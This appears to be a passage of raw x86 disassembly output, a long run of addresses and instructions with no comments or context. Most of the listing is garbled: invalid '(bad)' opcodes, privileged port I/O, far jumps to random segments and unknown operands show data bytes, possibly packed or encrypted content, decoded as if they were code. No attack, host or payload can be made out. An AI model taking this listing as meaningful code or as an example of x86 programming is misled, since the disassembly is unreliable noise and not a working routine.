  4324f7:	jle    0x4324eb
  4324f9:	mov    bh,0x7c
  4324fb:	test   eax,edi
  4324fd:	cdq    
  4324fe:	sub    BYTE PTR [esi],bh
  432500:	out    dx,eax
  432501:	sub    ah,BYTE PTR [esi]
  432503:	out    0x9e,al
  432505:	bound  esp,QWORD PTR [ebx-0x1]
  432508:	pop    es
  432509:	xor    BYTE PTR [edx],bl
  43250b:	cmp    eax,0x897f6644
  432510:	leave  
  432511:	popa   
  432512:	ret    0x7be5
  432515:	sbb    ecx,DWORD PTR [ebx-0x20bb00ed]
  43251b:	ror    BYTE PTR [edi-0x58],0x6a
  43251f:	dec    ecx
  432520:	cs test eax,0x2312939f
  432526:	addr16 mov bh,0xdb
  432529:	sub    BYTE PTR [esi-0x60bc4736],dl
  43252f:	es xor ebx,esi
  432532:	pop    ebp
  432533:	pop    esi
  432534:	cdq    
  432535:	cmp    bh,al
  432537:	lea    edx,[edi-0x2fd7ac81]
  43253d:	or     edx,ebx
  43253f:	mov    edx,0xa5b52b6
  432544:	xor    bh,cl
  432546:	(bad)  
  432547:	mov    bh,0x72
  432549:	out    0x85,al
  43254b:	repz cmc 
  43254d:	out    0xd6,eax
  43254f:	bound  eax,QWORD PTR [ecx]
  432551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432552:	cmc    
  432553:	xor    eax,0x1911a79f
  432558:	rcr    DWORD PTR cs:[eax],1
  43255b:	and    eax,0xaa85d556
  432560:	lods   al,BYTE PTR ds:[esi]
  432561:	(bad)  
  432562:	push   DWORD PTR [esi+ebp*4-0x6b9fb52c]
  432569:	test   DWORD PTR [edi-0x1d03972e],0x53e031a0
  432573:	sti    
  432574:	fisttp DWORD PTR ds:0xf811367b
  43257a:	call   0xb7221e1c
  43257f:	mov    ebx,0xdf4bdbbe
  432584:	cli    
  432585:	and    al,0xc6
  432587:	mov    dl,0x20
  432589:	scas   al,BYTE PTR es:[edi]
  43258a:	cmp    eax,0x53e6946d
  43258f:	adc    al,0x6d
  432591:	push   ebp
  432592:	es lahf 
  432594:	popf   
  432595:	mov    al,ds:0xdc510ae5
  43259a:	mov    al,0x1b
  43259c:	xchg   ebx,eax
  43259d:	retf   
  43259e:	sub    al,0x50
  4325a0:	pop    ecx
  4325a1:	rcl    BYTE PTR [ebp-0x41033723],1
  4325a7:	cmp    BYTE PTR [esi+0x765a16d5],bh
  4325ad:	cmp    DWORD PTR [eax+0x14],ebx
  4325b0:	arpl   WORD PTR [eax+0xa],sp
  4325b3:	push   ebp
  4325b4:	push   0x2e4cdadd
  4325b9:	gs ret 0x70ec
  4325bd:	push   ebx
  4325be:	dec    edx
  4325bf:	call   0x148d:0x88264c28
  4325c6:	jmp    0xf895:0x9f663a09
  4325cd:	je     0x432551
  4325cf:	push   cs
  4325d0:	mov    eax,ds:0x337fa704
  4325d5:	(bad)  
  4325d6:	jmp    0xc70c:0xc25156dd
  4325dd:	pop    ds
  4325de:	lea    esi,[eax+0x623ddbe7]
  4325e4:	shl    BYTE PTR [edi-0x74411020],1
  4325ea:	push   edx
  4325eb:	in     al,dx
  4325ec:	or     al,0x46
  4325ee:	push   edi
  4325ef:	sub    edx,DWORD PTR [ebx-0x33f00011]
  4325f5:	sti    
  4325f6:	pop    edi
  4325f7:	xchg   bh,ch
  4325f9:	out    dx,al
  4325fa:	mov    al,ds:0x29ebf6f5
  4325ff:	pop    ecx
  432600:	pop    ss
  432601:	mov    cl,0xe5
  432603:	mov    ebx,0x538c8c29
  432608:	leave  
  432609:	aas    
  43260a:	les    ecx,FWORD PTR [esi+edx*8-0x7d]
  43260e:	lods   eax,DWORD PTR ds:[esi]
  43260f:	jnp    0x43261e
  432611:	push   esi
  432612:	add    DWORD PTR [edi],0x6f
  432615:	jae    0x43264a
  432617:	dec    ebx
  432618:	and    esp,DWORD PTR [ebx-0x4c]
  43261b:	div    dh
  43261d:	push   edx
  43261e:	sub    esp,esp
  432620:	mov    DWORD PTR [edi-0x72f5c137],ecx
  432626:	rep lods eax,DWORD PTR ds:[esi]
  432628:	or     cl,BYTE PTR [edx+0x3d10cb21]
  43262e:	stc    
  43262f:	push   DWORD PTR [ebp-0xa]
  432632:	es push eax
  432634:	call   0xd5f3:0xdf7957a7
  43263b:	mov    esi,0xd6d75bef
  432640:	aad    0xeb
  432642:	je     0x432693
  432644:	test   DWORD PTR [edi+ecx*8+0x2e],0x82d0168d
  43264c:	push   eax
  43264d:	pop    eax
  43264e:	xor    al,0x47
  432650:	adc    BYTE PTR [edx-0x27],ah
  432653:	or     BYTE PTR [edi+eax*4-0x1b],ch
  432657:	sub    BYTE PTR [esi+0x21262431],cl
  43265d:	and    DWORD PTR [esi],edi
  43265f:	xchg   edx,eax
  432660:	dec    esi
  432661:	into   
  432662:	shl    DWORD PTR [esi],0x18
  432665:	pushf  
  432666:	jecxz  0x43268d
  432668:	mov    DWORD PTR [ecx-0x72],ebx
  43266b:	inc    ecx
  43266c:	and    BYTE PTR [ebx+0x32c9638d],al
  432672:	and    BYTE PTR [esp+eax*1-0x4e],al
  432676:	inc    eax
  432677:	xor    DWORD PTR [edx+ebx*4],0x5d
  43267b:	xor    edx,ebx
  43267d:	xor    edi,DWORD PTR [ebp+0x77755777]
  432683:	in     eax,dx
  432684:	push   ebp
  432685:	pop    ebp
  432686:	jnp    0x4326dd
  432688:	xlat   BYTE PTR ds:[ebx]
  432689:	sahf   
  43268a:	(bad)  
  43268b:	sti    
  43268c:	cmc    
  43268d:	std    
  43268e:	cmc    
  43268f:	repz (bad) 
  432691:	sbb    BYTE PTR ds:0x7d39d49f,0xaa
  432698:	cli    
  432699:	sti    
  43269a:	dec    bl
  43269c:	mov    ebx,0xcf2ef7de
  4326a1:	jge    0x432691
  4326a3:	fs popa 
  4326a5:	xchg   edx,eax
  4326a6:	je     0x4326bd
  4326a8:	sbb    edi,DWORD PTR [edi+ebx*2+0x1b]
  4326ac:	test   ecx,ebp
  4326ae:	fdiv   DWORD PTR [esi+0x72]
  4326b1:	inc    eax
  4326b2:	sbb    ecx,DWORD PTR [ebx+0x5fea857b]
  4326b8:	lods   al,BYTE PTR ds:[esi]
  4326b9:	nop
  4326ba:	sub    edx,DWORD PTR [ebx-0x26]
  4326bd:	cdq    
  4326be:	pop    edx
  4326bf:	push   ecx
  4326c0:	jne    0x432729
  4326c2:	stos   BYTE PTR es:[edi],al
  4326c3:	(bad)  
  4326c4:	mov    bl,0xad
  4326c6:	stos   BYTE PTR es:[edi],al
  4326c7:	sbb    DWORD PTR [edx],0xa8f23f2d
  4326cd:	call   0x1a13:0x30b87e1b
  4326d4:	jne    0x43267f
  4326d6:	out    0xf1,eax
  4326d8:	sti    
  4326d9:	mov    eax,ds:0x979c985a
  4326de:	arpl   sp,cx
  4326e0:	mov    DWORD PTR [ebx-0x30],0xab58e9c2
  4326e7:	xor    DWORD PTR [eax],0x6c
  4326ea:	mov    esp,0x4e5f64fd
  4326ef:	enter  0x1cf5,0x77
  4326f3:	bound  ebx,QWORD PTR [edi-0x25ef34af]
  4326f9:	jae    0x4326a3
  4326fb:	mov    esi,0x75e65e6
  432700:	dec    edx
  432701:	and    ebx,0xd1e7005b
  432707:	test   BYTE PTR [eax+0x38],ah
  43270a:	adc    al,0xc9
  43270c:	inc    eax
  43270d:	cmc    
  43270e:	jb     0x432734
  432710:	and    dl,0xf
  432713:	fistp  DWORD PTR [ecx-0x5d]
  432716:	and    BYTE PTR [ebx+0x20],dl
  432719:	lods   al,BYTE PTR ds:[esi]
  43271a:	les    esp,FWORD PTR [edx-0x27]
  43271d:	leave  
  43271e:	push   ds
  43271f:	(bad)  
  432720:	cs push ebx
  432722:	das    
  432723:	jecxz  0x4326c2
  432725:	ins    BYTE PTR es:[edi],dx
  432726:	mov    edx,DWORD PTR [edi]
  432728:	dec    edx
  432729:	(bad)  
  43272a:	pop    ds
  43272b:	push   edi
  43272c:	xchg   DWORD PTR [eax+0x766c528],edx
  432732:	retf   0x2958
  432735:	mov    bl,0xcb
  432737:	mov    dl,0xd8
  432739:	pusha  
  43273a:	jmp    0x4327b9
  43273c:	(bad)  
  43273d:	mov    DWORD PTR [esi],ecx
  43273f:	mov    ch,0x5e
  432741:	cli    
  432742:	addr16 call 0x7fd:0x76a42b9b
  43274a:	mov    ah,0x9d
  43274c:	in     al,dx
  43274d:	fisubr WORD PTR [ebx-0x854ea31]
  432753:	mov    esp,0xadde87ea
  432758:	mov    DWORD PTR [edi],edx
  43275a:	jg     0x432719
  43275c:	cwde   
  43275d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43275e:	mov    edx,0xee2fe542
  432763:	scas   al,BYTE PTR es:[edi]
  432764:	cwde   
  432765:	push   eax
  432766:	gs jmp 0x100d98da
  43276c:	test   al,0xb1
  43276e:	sti    
  43276f:	xor    DWORD PTR ds:0x5b56dd4e,ebp
  432775:	call   DWORD PTR [ebx-0x56]
  432778:	imul   ebp,DWORD PTR [ecx+0x616ef550],0x53
  43277f:	jg     0x432774
  432781:	push   edi
  432782:	push   esp
  432783:	jno    0x432771
  432785:	dec    ecx
  432786:	xor    eax,0x9ca07d74
  43278b:	pop    edi
  43278c:	push   eax
  43278d:	stos   BYTE PTR es:[edi],al
  43278e:	sahf   
  43278f:	rcr    dl,cl
  432791:	test   edi,ecx
  432793:	call   0x7633a64f
  432798:	popf   
  432799:	mov    ebp,0x17dcbd76
  43279e:	or     BYTE PTR [esi],dh
  4327a0:	fist   WORD PTR [edi+0x74]
  4327a3:	mov    ah,0xf2
  4327a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4327a6:	and    DWORD PTR [ebp+0x5c],ebp
  4327a9:	aas    
  4327aa:	stos   DWORD PTR es:[edi],eax
  4327ab:	(bad)  [edi-0x5]
  4327ae:	mov    ah,0x16
  4327b0:	out    dx,al
  4327b1:	jle    0x4327fe
  4327b3:	mov    ebp,0x7d6a8f1d
  4327b8:	jmp    0x5a454133
  4327bd:	(bad)  [edx]
  4327bf:	lods   al,BYTE PTR ds:[esi]
  4327c0:	stos   BYTE PTR es:[edi],al
  4327c1:	ret    0xb87c
  4327c4:	mov    ebx,0xebaa9af9
  4327c9:	fist   DWORD PTR [ebp+0x53]
  4327cc:	jg     0x432782
  4327ce:	ins    BYTE PTR es:[edi],dx
  4327cf:	or     edx,DWORD PTR [edi-0x16]
  4327d2:	push   esp
  4327d3:	jno    0x4327d4
  4327d5:	ins    DWORD PTR es:[edi],dx
  4327d6:	dec    ebp
  4327d7:	cld    
  4327d8:	out    0x87,al
  4327da:	or     ebp,ebp
  4327dc:	pusha  
  4327dd:	pop    edi
  4327de:	push   ebx
  4327df:	int    0xc7
  4327e1:	cmc    
  4327e2:	in     al,0x8f
  4327e4:	jg     0x432798
  4327e6:	clc    
  4327e7:	mov    esp,0x9dfb68a3
  4327ec:	mov    ds:0xdcda6d7d,al
  4327f1:	mov    edi,0x6af6d2a0
  4327f6:	xor    DWORD PTR [esi+0x3f],eax
  4327f9:	mov    al,ds:0xaa9ba5f9
  4327fe:	sub    eax,0x9aea91b4
  432803:	ds ins DWORD PTR es:[edi],dx
  432805:	out    dx,eax
  432806:	ins    DWORD PTR es:[edi],dx
  432807:	push   ss
  432808:	mov    esi,DWORD PTR [ebx-0x50944cbf]
  43280e:	call   0xbad72363
  432813:	pop    ebx
  432814:	cwde   
  432815:	or     BYTE PTR [ebp-0x7b],dh
  432818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432819:	mov    al,0xbd
  43281b:	mov    ebx,0xfe5c6fa9
  432820:	and    eax,0x80f9ee1d
  432825:	call   0xb070:0x74538af6
  43282c:	js     0x43280c
  43282e:	mov    al,0x56
  432830:	mov    esi,0xf6bd45f1
  432835:	fdivp  st(7),st
  432837:	pop    esi
  432838:	xlat   BYTE PTR ds:[ebx]
  432839:	imul   dh
  43283b:	dec    ecx
  43283c:	jmp    FWORD PTR [ecx+0x5949f098]
  432842:	xchg   ebp,eax
  432843:	test   BYTE PTR [ebx],bl
  432845:	mov    ?,ecx
  432847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432848:	in     al,dx
  432849:	cmp    DWORD PTR [ecx],esi
  43284b:	loop   0x4328c1
  43284d:	repnz sbb al,0x93
  432850:	dec    ebp
  432851:	mov    dl,0xa4
  432853:	mov    dl,0xf6
  432855:	(bad)  
  432856:	mov    eax,ds:0xa38f9140
  43285b:	and    DWORD PTR [eax],edx
  43285d:	xchg   bh,bl
  43285f:	jae    0x4328b7
  432861:	and    ebx,DWORD PTR [edi+0x7d3529fc]
  432867:	addr16 mov eax,ds:0x3d79
  43286b:	div    ebx
  43286d:	gs cs mov ebp,0xd05cafd5
  432874:	out    dx,al
  432875:	pop    esi
  432876:	icebp  
  432877:	xchg   esp,eax
  432878:	(bad)  
  432879:	loop   0x43284f
  43287b:	pop    esi
  43287c:	pop    edi
  43287d:	rcr    BYTE PTR [edx-0x2f],cl
  432880:	scas   eax,DWORD PTR es:[edi]
  432881:	fs shl ah,cl
  432884:	mov    ebp,0x2f735bbf
  432889:	int3   
  43288a:	stos   DWORD PTR es:[edi],eax
  43288b:	test   eax,0x6777f0d8
  432890:	mov    dh,0xcb
  432892:	sbb    bl,bh
  432894:	retf   0x6dfa
  432897:	jne    0x4328d7
  432899:	mov    esi,0x4af6eaaf
  43289e:	xchg   ebp,eax
  43289f:	push   0xffffffea
  4328a1:	push   esp
  4328a2:	aad    0x94
  4328a4:	sub    ch,cl
  4328a6:	mov    ah,0x68
  4328a8:	addr16 mov ebp,0x1b131b4a
  4328ae:	stos   BYTE PTR es:[edi],al
  4328af:	sub    dh,BYTE PTR ds:0xab6e0216
  4328b5:	mov    al,0xf5
  4328b7:	xlat   BYTE PTR ds:[ebx]
  4328b8:	mov    ch,0x30
  4328ba:	mov    edx,0x856352a9
  4328bf:	call   0xae08:0x55200d0a
  4328c6:	push   0x3bef55ac
  4328cb:	jp     0x432881
  4328cd:	mov    ebx,0x7f0baabe
  4328d2:	jl     0x432932
  4328d4:	pop    ds
  4328d5:	cli    
  4328d6:	pop    es
  4328d7:	call   DWORD PTR [esi+0x77]
  4328da:	pop    ss
  4328db:	scas   al,BYTE PTR es:[edi]
  4328dc:	stos   BYTE PTR es:[edi],al
  4328dd:	mov    ah,0x71
  4328df:	push   esp
  4328e0:	sbb    esi,DWORD PTR [edi+0xd3b437e]
  4328e6:	inc    edi
  4328e7:	xor    eax,0xb27c8f1
  4328ec:	mov    eax,ds:0xdfb6a0d3
  4328f1:	(bad)  
  4328f2:	mov    al,0xaa
  4328f4:	pop    es
  4328f5:	push   cs
  4328f6:	adc    eax,0x8503ef3
  4328fb:	loop   0x43294b
  4328fd:	in     eax,dx
  4328fe:	dec    esp
  4328ff:	jmp    FWORD PTR [ecx+0x21]
  432902:	inc    esp
  432903:	mov    edi,0x84ddf9a0
  432908:	xor    bh,BYTE PTR [edi+eiz*4-0x56]
  43290c:	mov    eax,DWORD PTR [esi-0x1773f089]
  432912:	div    bl
  432914:	scas   eax,DWORD PTR es:[edi]
  432915:	test   al,0xbd
  432917:	mov    ebx,0x3acb98b7
  43291c:	in     eax,dx
  43291d:	push   ss
  43291e:	pop    es
  43291f:	inc    ebx
  432920:	add    dh,al
  432922:	aaa    
  432923:	or     eax,0x54e31634
  432928:	lods   eax,DWORD PTR ds:[esi]
  432929:	mov    ecx,0xa5cb4757
  43292e:	mov    esi,0x551b5baa
  432933:	push   ecx
  432934:	sbb    al,0x95
  432936:	mov    esi,DWORD PTR [ebx-0x6d]
  432939:	jmp    0x5e2e:0x76a8f078
  432940:	aad    0xe6
  432942:	imul   eax,ebp,0xfffffff6
  432945:	mov    ebp,0x54aaa5bb
  43294a:	mov    esi,0xcd0681fb
  43294f:	pushf  
  432950:	cmp    ebp,DWORD PTR [ebx-0x7c006c02]
  432956:	push   esi
  432957:	(bad)  
  432958:	pop    edi
  432959:	push   ebp
  43295a:	jnp    0x432937
  43295c:	push   ecx
  43295d:	cmp    eax,0xe56df7db
  432962:	lea    edi,[ebx+0x23]
  432965:	not    dl
  432967:	xchg   ebp,eax
  432968:	in     al,dx
  432969:	add    al,0xce
  43296b:	mov    DWORD PTR [ebx],edi
  43296d:	sub    DWORD PTR [esi-0x76],ecx
  432970:	mov    edi,0x93f63b6d
  432975:	(bad)  
  432977:	xchg   ebx,eax
  432978:	xchg   esp,eax
  432979:	test   edi,edi
  43297b:	mov    WORD PTR [esi+ecx*2],cs
  43297e:	sar    BYTE PTR [ebx+0x7b],cl
  432981:	inc    edx
  432982:	inc    eax
  432983:	xchg   esp,eax
  432984:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  432986:	data16 or al,cl
  432989:	mov    al,ds:0x8051a009
  43298e:	pop    ss
  43298f:	push   eax
  432990:	mov    ah,0xe3
  432992:	adc    dl,BYTE PTR ds:[eax]
  432995:	enter  0x2968,0x5e
  432999:	push   cs
  43299a:	pop    esp
  43299b:	xchg   esp,eax
  43299c:	adc    esp,DWORD PTR [ebx+0x7a9ae49]
  4329a2:	retf   0x4908
  4329a5:	inc    esp
  4329a6:	jbe    0x4329b9
  4329a8:	adc    ch,BYTE PTR [ebp+0x57]
  4329ab:	jbe    0x4329e3
  4329ad:	mov    al,0xb1
  4329af:	aaa    
  4329b0:	loop   0x432956
  4329b2:	imul   ecx,DWORD PTR [esi-0x5f171085],0x472109fa
  4329bc:	xchg   ebp,eax
  4329bd:	sbb    al,0x19
  4329bf:	test   al,0x92
  4329c1:	dec    ebx
  4329c2:	xchg   ebx,eax
  4329c3:	aaa    
  4329c4:	push   ss
  4329c5:	das    
  4329c6:	cmp    ecx,ebx
  4329c8:	fbld   TBYTE PTR [esi-0x5541c8ed]
  4329ce:	in     eax,dx
  4329cf:	lods   eax,DWORD PTR ds:[esi]
  4329d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4329d1:	bound  esi,QWORD PTR [ebx-0x231f09eb]
  4329d7:	sahf   
  4329d8:	data16 cs std 
  4329db:	xchg   ecx,eax
  4329dc:	sbb    bh,BYTE PTR [edx-0x31]
  4329df:	push   0x537f85fc
  4329e4:	ins    BYTE PTR es:[edi],dx
  4329e5:	mov    esi,0x2c9ef56a
  4329ea:	in     al,dx
  4329eb:	mov    ch,0xca
  4329ed:	sub    DWORD PTR [ebp-0x15],edi
  4329f0:	sub    ecx,DWORD PTR [ebx+0x3a]
  4329f3:	cli    
  4329f4:	call   0x600a8f1c
  4329f9:	arpl   WORD PTR [ebx+0x77],si
  4329fc:	popa   
  4329fd:	iret   
  4329fe:	jge    0x4329a4
  432a00:	clc    
  432a01:	cld    
  432a02:	dec    ebp
  432a03:	push   ebp
  432a04:	cs pop ds
  432a06:	das    
  432a07:	xchg   DWORD PTR ds:0xa8aec6b6,edi
  432a0d:	mov    dh,0xe7
  432a0f:	pop    ebp
  432a10:	dec    edx
  432a11:	test   esi,esp
  432a13:	push   0x5b
  432a15:	aas    
  432a16:	stos   DWORD PTR es:[edi],eax
  432a17:	(bad)  
  432a18:	std    
  432a19:	jmp    0xc62efffd
  432a1e:	mov    ?,ecx
  432a20:	lock clc 
  432a22:	int    0xfb
  432a24:	add    DWORD PTR [esp+edi*4-0xc],0x23
  432a29:	sti    
  432a2a:	lods   eax,DWORD PTR ds:[esi]
  432a2b:	mov    edx,0xaabd56fb
  432a30:	xchg   dh,bh
  432a32:	test   DWORD PTR [esi],edx
  432a34:	sub    edi,esi
  432a36:	pop    eax
  432a37:	cmc    
  432a38:	aad    0x67
  432a3a:	mov    edi,DWORD PTR [ebp-0x63c75b81]
  432a40:	mov    gs,ebx
  432a42:	out    dx,al
  432a43:	fisubr WORD PTR ds:0xb14aed5
  432a49:	mov    al,ds:0xcb5550a5
  432a4e:	adc    eax,0xa0f61392
  432a53:	mov    ch,0x68
  432a55:	pop    edi
  432a56:	ret    0xaf7b
  432a59:	adc    al,0xcf
  432a5b:	imul   ebp,DWORD PTR [ebx],0x18a3779e
  432a61:	mov    DWORD PTR ds:0x3bfe9e95,0x9f8bfd2a
  432a6b:	ror    esi,1
  432a6d:	in     eax,dx
  432a6e:	or     ebp,DWORD PTR [edx-0x11281516]
  432a74:	push   0x1d1e8b61
  432a79:	push   esp
  432a7a:	jecxz  0x432a3f
  432a7c:	aas    
  432a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432a7e:	push   edx
  432a7f:	jno    0x432ad0
  432a81:	loop   0x432a87
  432a83:	dec    eax
  432a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432a85:	scas   eax,DWORD PTR es:[edi]
  432a86:	mov    dh,0xf4
  432a88:	aad    0xa2
  432a8a:	out    dx,eax
  432a8b:	mov    esi,DWORD PTR [bx+di]
  432a8e:	jge    0x432a4e
  432a90:	pop    eax
  432a91:	hlt    
  432a92:	lds    esp,FWORD PTR [esi]
  432a94:	scas   eax,DWORD PTR es:[edi]
  432a95:	in     al,dx
  432a96:	push   eax
  432a97:	jne    0x432aee
  432a99:	dec    ebx
  432a9a:	popa   
  432a9b:	or     ch,BYTE PTR [eax+ebp*2-0x15340a92]
  432aa2:	push   0x7e
  432aa4:	inc    edx
  432aa5:	jne    0x432a2c
  432aa7:	stc    
  432aa8:	push   eax
  432aa9:	pop    ecx
  432aaa:	mov    edi,0x87fdeaa8
  432aaf:	xor    al,0x7d
  432ab1:	in     eax,dx
  432ab2:	pop    ecx
  432ab3:	lods   eax,DWORD PTR ds:[esi]
  432ab4:	cld    
  432ab5:	sar    DWORD PTR [edi-0x52],cl
  432ab8:	aas    
  432ab9:	stc    
  432aba:	addr16 jg 0x432b17
  432abd:	push   ds
  432abe:	not    DWORD PTR [ecx-0x47]
  432ac1:	dec    esp
  432ac2:	aam    0x68
  432ac4:	ss push edi
  432ac6:	mov    esi,DWORD PTR [edx]
  432ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432ac9:	sbb    esi,DWORD PTR [eax+0x1d69a4e1]
  432acf:	mov    ecx,edi
  432ad1:	ret    0xbf1
  432ad4:	sbb    eax,0x94e9fa78
  432ad9:	dec    ebp
  432ada:	and    BYTE PTR [eax+edx*1],0x86
  432ade:	fidiv  WORD PTR [ebx+0x46]
  432ae1:	(bad)  
  432ae2:	jg     0x432ada
  432ae4:	outs   dx,DWORD PTR ds:[esi]
  432ae5:	stos   DWORD PTR es:[edi],eax
  432ae6:	stc    
  432ae7:	mov    ebx,0x63db5bbe
  432aec:	mov    edi,0x850bcdad
  432af1:	mov    eax,ds:0x396853b1
  432af6:	in     eax,dx
  432af7:	mov    ebx,0xa0be09c5
  432afc:	sbb    ebx,DWORD PTR [edi-0xe1caf65]
  432b02:	sbb    dl,ch
  432b04:	or     eax,0x7f2a17f5
  432b09:	test   edx,ebp
  432b0b:	pop    es
  432b0c:	jbe    0x432a99
  432b0e:	or     eax,0x2bbbadb2
  432b13:	stos   DWORD PTR es:[edi],eax
  432b14:	push   0x79
  432b16:	jo     0x432b67
  432b18:	sbb    esi,DWORD PTR [ebx]
  432b1a:	jmp    0x432b46
  432b1c:	adc    eax,0x52e52002
  432b21:	in     al,dx
  432b22:	adc    eax,0xd1d75c23
  432b27:	mov    al,ds:0xad0af1f5
  432b2c:	pop    esp
  432b2d:	sub    eax,DWORD PTR [esi+eax*2]
  432b30:	popa   
  432b31:	ds in  al,dx
  432b33:	outs   dx,BYTE PTR ds:[esi]
  432b34:	push   ebp
  432b35:	xchg   ebp,eax
  432b36:	loope  0x432b11
  432b38:	xchg   ebp,eax
  432b39:	int    0xf5
  432b3b:	test   DWORD PTR [ecx-0x49],ebx
  432b3e:	push   ecx
  432b3f:	sub    BYTE PTR [eax+0x3b],ch
  432b42:	pop    edx
  432b43:	sbb    al,0x5b
  432b45:	ror    cl,cl
  432b47:	out    dx,eax
  432b48:	cmp    ebp,DWORD PTR [ebx+0x65f38b89]
  432b4e:	pop    edi
  432b4f:	inc    eax
  432b50:	ret    
  432b51:	shl    BYTE PTR [ecx-0x53],1
  432b54:	sub    eax,0x77e9d05f
  432b59:	jg     0x432ba5
  432b5b:	sti    
  432b5c:	sti    
  432b5d:	pop    ebx
  432b5e:	mov    edx,0x50ffeff5
  432b63:	sub    edi,0x7b
  432b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432b67:	push   eax
  432b68:	gs iret 
  432b6a:	jmp    0x432bc3
  432b6c:	jg     0x432b52
  432b6e:	xlat   BYTE PTR ds:[ebx]
  432b6f:	hlt    
  432b70:	out    dx,al
  432b71:	jg     0x432b72
  432b73:	lods   al,BYTE PTR ds:[esi]
  432b74:	call   0xec7e:0xb531f67f
  432b7b:	mov    eax,0xd4961b36
  432b80:	aad    0xfa
  432b82:	sbb    edx,0x29
  432b85:	aam    0xf4
  432b87:	cmc    
  432b88:	repz jmp DWORD PTR [ebx+0x5577d696]
  432b8f:	std    
  432b90:	fadd   st,st(7)
  432b92:	or     edi,DWORD PTR [ebx]
  432b94:	jg     0x432be8
  432b96:	jge    0x432b1f
  432b98:	(bad)  
  432b99:	stos   DWORD PTR es:[edi],eax
  432b9a:	mov    esi,0x632b49ae
  432b9f:	mov    bh,0xb4
  432ba1:	mov    ebx,0x1f9851b6
  432ba6:	test   DWORD PTR [edx+0x5f],ebx
  432ba9:	pop    ebx
  432baa:	or     BYTE PTR [edx-0x5d0d1617],bl
  432bb0:	outs   dx,DWORD PTR ds:[esi]
  432bb1:	cmp    eax,0x69685833
  432bb6:	cmp    ebx,DWORD PTR [edx+0x78]
  432bb9:	jecxz  0x432b71
  432bbb:	call   0x9f98:0xb92b170f
  432bc2:	lds    edx,FWORD PTR [edi-0x621c5652]
  432bc8:	std    
  432bc9:	pop    edx
  432bca:	pop    ebp
  432bcb:	sub    esp,eax
  432bcd:	inc    ebx
  432bce:	popa   
  432bcf:	call   DWORD PTR [edi+0x6f71930a]
  432bd5:	ins    DWORD PTR es:[edi],dx
  432bd6:	push   edi
  432bd7:	retf   
  432bd8:	pop    ds
  432bd9:	jns    0x432c23
  432bdb:	pop    ebp
  432bdc:	ret    
  432bdd:	lahf   
  432bde:	push   eax
  432bdf:	aad    0x4e
  432be1:	and    DWORD PTR [esi+edx*2+0x6767abce],edi
  432be8:	push   esi
  432be9:	mov    edi,0xcb67e67d
  432bee:	arpl   WORD PTR [esi],di
  432bf0:	sbb    DWORD PTR [edi-0x8e28ada],eax
  432bf6:	arpl   WORD PTR [esi+0x40],bx
  432bf9:	fisub  DWORD PTR [edx+0x54ece7d2]
  432bff:	imul   ecx,DWORD PTR [esi],0xe39ec70e
  432c05:	sahf   
  432c06:	std    
  432c07:	cwde   
  432c08:	cmp    ebx,DWORD PTR [edi+eax*4]
  432c0b:	imul   edi,DWORD PTR [esi],0x1c312692
  432c11:	cmp    ah,0x96
  432c14:	lods   al,BYTE PTR ds:[esi]
  432c15:	push   ecx
  432c16:	out    0xc8,eax
  432c18:	inc    eax
  432c19:	jl     0x432c8d
  432c1b:	inc    esp
  432c1c:	adc    eax,0xef2df8c8
  432c21:	fnsave [ebx]
  432c23:	sub    dh,BYTE PTR [ebx+0x17]
  432c26:	xchg   esp,eax
  432c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432c28:	inc    ecx
  432c29:	ins    DWORD PTR es:[edi],dx
  432c2a:	ins    BYTE PTR es:[edi],dx
  432c2b:	push   eax
  432c2c:	mov    cl,BYTE PTR [ebx]
  432c2e:	jbe    0x432bf8
  432c30:	ss inc esp
  432c32:	ins    DWORD PTR es:[edi],dx
  432c33:	ins    BYTE PTR es:[edi],dx
  432c34:	fiadd  DWORD PTR [ebx+0x32]
  432c37:	stc    
  432c38:	and    BYTE PTR [ecx+0x8],ah
  432c3b:	dec    esp
  432c3c:	mov    BYTE PTR [esi-0x47],bl
  432c3f:	add    cl,BYTE PTR [ebx+0x43]
  432c42:	ins    BYTE PTR es:[edi],dx
  432c43:	loop   0x432c4f
  432c45:	cmp    DWORD PTR [ecx+0x7f8e45a1],ecx
  432c4b:	mov    es,esp
  432c4d:	jae    0x432c20
  432c4f:	adc    al,0x80
  432c51:	xor    esp,DWORD PTR [edx-0x5d39897e]
  432c57:	jmp    0x432be3
  432c59:	ja     0x432bf1
  432c5b:	ret    
  432c5c:	pop    eax
  432c5d:	mov    DWORD PTR [ecx],esp
  432c5f:	out    0x47,al
  432c61:	fbld   TBYTE PTR [edi+0x79f85fea]
  432c67:	aad    0x24
  432c69:	jmp    0xfb5c:0xcd6dbda4
  432c70:	mov    dl,0x36
  432c72:	mov    dh,0xd7
  432c74:	push   esp
  432c75:	mov    ch,0x35
  432c77:	pop    ebx
  432c78:	sub    al,0x90
  432c7a:	xchg   edi,eax
  432c7b:	jne    0x432c75
  432c7d:	loope  0x432c8d
  432c7f:	dec    ebp
  432c80:	pop    esi
  432c81:	sahf   
  432c82:	shr    edx,cl
  432c84:	ret    0x7ab6
  432c87:	xchg   BYTE PTR [edi-0x2c],al
  432c8a:	fdivr  DWORD PTR [ecx+0x46]
  432c8d:	frstor [edi-0x19795bc2]
  432c93:	arpl   WORD PTR [ebp-0x6f4a8f47],ax
  432c99:	loop   0x432c98
  432c9b:	fidivr DWORD PTR [esi-0x3]
  432c9e:	div    DWORD PTR [ebp+0x477ef7fd]
  432ca4:	fcmovne st,st(7)
  432ca6:	fst    st(6)
  432ca8:	hlt    
  432ca9:	ror    BYTE PTR [edx-0xa0909aa],cl
  432caf:	bound  eax,QWORD PTR [ebx-0x43]
  432cb2:	xchg   esi,eax
  432cb3:	dec    edx
  432cb4:	lds    eax,FWORD PTR [esi+0x5e]
  432cb7:	pop    ebx
  432cb8:	mov    ebx,0x1d878b8f
